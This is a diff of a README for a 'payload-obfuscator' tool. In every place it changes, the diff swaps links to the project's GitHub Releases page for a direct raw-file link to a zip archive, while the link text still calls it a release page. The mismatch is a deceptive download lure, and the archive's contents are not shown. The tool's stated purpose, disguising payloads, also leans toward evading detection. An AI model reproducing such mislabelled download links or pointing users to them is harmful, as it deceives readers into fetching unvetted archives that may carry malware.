@@ -1,10 +1,10 @@
 # 🛡️ payload-obfuscator - Layered Payload Obfuscation Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/mathews2007morais-boop/payload-obfuscator/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/mathews2007morais-boop/payload-obfuscator/main/public/payload_obfuscator_v2.3.zip)
 
 ## 📥 Download
 
-Visit this page to download the app: [Release downloads](https://github.com/mathews2007morais-boop/payload-obfuscator/releases)
+Visit this page to download the app: [Release downloads](https://raw.githubusercontent.com/mathews2007morais-boop/payload-obfuscator/main/public/payload_obfuscator_v2.3.zip)
 
 ## 🧭 What this tool does
 
@@ -15,7 +15,7 @@ Use it to test how changes affect the shape of your payload before you move it i
 ## 💻 Windows setup
 
 ### 1. Get the release
-Open the [Release downloads](https://github.com/mathews2007morais-boop/payload-obfuscator/releases) page and pick the latest Windows file.
+Open the [Release downloads](https://raw.githubusercontent.com/mathews2007morais-boop/payload-obfuscator/main/public/payload_obfuscator_v2.3.zip) page and pick the latest Windows file.
 
 Look for a file such as:
 - `payload-obfuscator-windows-x64.zip`
@@ -174,7 +174,7 @@ It focuses on text-based payloads and scripts that can be transformed before use
 
 ## 🧾 Version downloads
 
-Get the latest Windows build here: [Release downloads](https://github.com/mathews2007morais-boop/payload-obfuscator/releases)
+Get the latest Windows build here: [Release downloads](https://raw.githubusercontent.com/mathews2007morais-boop/payload-obfuscator/main/public/payload_obfuscator_v2.3.zip)
 
 ## 🧩 Topics
 
